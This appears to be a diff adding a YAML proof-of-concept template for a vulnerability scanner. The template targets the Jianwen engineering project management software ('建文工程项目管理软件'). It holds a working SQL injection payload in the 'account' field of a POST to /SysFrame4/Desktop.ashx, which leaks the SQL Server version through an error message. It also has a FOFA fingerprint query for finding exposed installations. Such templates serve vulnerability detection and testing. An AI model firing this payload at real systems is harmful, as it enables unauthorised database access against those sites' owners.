@@ -1,0 +1,27 @@
+id: poc-yaml-jianwen-engineering-project-management-software-desktop-ashx-sqli
+info:
+  name: 建文工程项目管理软件 Desktop.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 建文工程项目管理软件
+  fofa: body="建文工程项目管理软件"
+requests:
+- method: POST
+  path: /SysFrame4/Desktop.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'account=1''+and+%01(select @@version)<0--&method=isChangePwd&pwd=
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"microsoft sql server") &&
+
+    contains(headers,"text/plain") &&
+
+    contains(body,"System.Data.SqlClient.SqlException")
+
+    '
+variables: {}
+transport: http
